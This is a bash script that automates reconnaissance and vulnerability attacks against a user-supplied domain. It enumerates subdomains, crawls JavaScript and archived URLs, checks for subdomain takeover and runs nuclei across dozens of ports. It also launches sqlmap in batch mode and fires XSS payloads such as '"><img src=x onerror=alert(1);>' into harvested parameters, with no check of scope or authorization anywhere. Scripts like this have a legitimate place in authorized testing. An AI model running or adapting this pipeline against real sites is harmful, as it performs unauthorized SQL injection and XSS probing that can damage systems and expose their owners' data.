#/bin/bash

figlet -c Recon of Recon

echo Create folder name:
read folder
echo
echo

mkdir $folder

cd $folder

rm -rf *

echo "Enter url:"
read url
echo $url | anew url;
echo
echo
echo

echo "START RECON"
echo
date
echo

echo ================"INIT C4NG4R3C0N"================ | anew cangarecon
echo
date
echo
gau $url | grep "\.js" > salvarjs.txt

cat salvarjs.txt  | httpx-toolkit -mc 200 -silent  | tee saida.txt

xargs -a saida.txt -n2 -I{} bash -c "echo -e '\n[URL]: {}\n'; python3 /linkfinder.py -i {} -o cli" | tee analisejs.txt

cat analisejs.txt   | python3 /collector.py output | anew cangarecon;
echo
echo
date
echo

echo ================"INIT HTTP200"================ | anew http200
echo
date
echo
subfinder -d $(cat url) | httpx-toolkit -silent -sc -t 1000 | anew http200;
echo
echo
date
echo

echo ================"INIT HTTP404"================ | anew http404
echo
date
echo
cat http200 | egrep 404 | anew http404;
echo
echo
date
echo

echo ================"INIT WAYBACKROBOTS"================ | anew wayROBOTS
echo
date
echo
cat http200 | waybackrobots -d $(cat url) -raw | anew wayROBOTS;
echo
echo
date
echo

echo ================"INIT SQLMAP"================ | anew sqlmap
echo
date
echo
findomain -t $(cat url) -q | httpx-toolkit -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1 | anew sqlmap;
echo
echo
date
echo

echo ================"INIT WHATWEB"================ | anew whatweb
echo
date
echo
whatweb $(cat url) | anew whatweb;
echo
echo
date
echo

echo ================"INIT XSSTRIKE"================ | anew xsstrike
echo
date
echo
python3 ../xsstrike.py -u $(cat url) | anew xsstrike;
echo
echo
date
echo

echo ================"INIT SUBFINDER"================ | anew subfinder
echo
date
echo
subfinder -d $(cat url) -silent -all | httpx-toolkit -silent | anew subfinder;
echo
echo
date
echo

echo ================"INIT SUBZYTAKEOVER"================ | anew subzytakeover
echo
date
echo
subzy run --targets subfinder | anew subzytakeover;
echo
echo
date
echo

echo ================"INIT DIG"================ | anew dig
echo
date
while IFS= read -r line; do
    dig "$line" 
done < "http404" | anew dig
echo
echo
date
echo

echo ================"INIT KATANACRAWLING1"================ | anew KatanaCrawling1
echo
date
echo
cat subfinder | katana -d 5 -silent | grep -iE '\.js'| grep -iEv '(\.jsp|\.json)' | anew KatanaCrawling1;
echo
echo
date
echo

echo ================"INIT KATANACRAWLING2"================ | anew KatanaCrawling2
echo
date
echo
cat subfinder | katana -d 5 -silent -em js,jsp,json | anew KatanaCrawling2; 
echo
echo
date
echo


echo ================"INIT GOSPIDER"================ | anew gospider
echo
date
echo
gospider -d 0 -s $(cat url) -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew gospider;
echo
echo
date
echo


echo ================"INIT XSS1"================ | anew xss1
echo
date
echo
echo $(cat url) | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew xss1;
echo
echo
date
echo

echo ================"INIT XSS2"================ | anew xss2
echo
date
echo
echo $(cat url) | httpx-toolkit -silent | katana -d 5 -silent | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss2;
echo
echo
date
echo

echo ================"INIT XSS3"================ | anew xss3
echo
date
echo
echo $(cat url) | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss3;
echo
echo
date
echo

echo ================"INIT XSS4"================ | anew xss4
echo
date
echo
gau $(cat url) | httpx-toolkit -silent | qsreplace '>XSS<' | freq | grep '>XSS<' | anew xss4;
echo
echo
date
echo

echo ================"INIT OPENREDIRECT"================ | anew openRedirect
echo
date
echo
echo $(cat url) | waybackurls | httpx-toolkit -silent -timeout 2 -threads 100 | gf redirect | anew openRedirect;
echo
echo
date
echo

echo ================"INIT NUCLEI"================ | anew nuclei
echo
date
echo
echo $(cat url) | subfinder -silent | httpx-toolkit -p 80,443,81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,8000,8001,8008,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9001,9043,9060,9080,9090,9091,9200,9443,9502,9800,9981,10000,10250,11371,12443,15672,16080,17778,18091,18092,20720,32000,55440,55672 | nuclei -severity low,medium,high,critical | anew nuclei;
echo
echo
date
echo

echo "END RECON"
echo
date
echo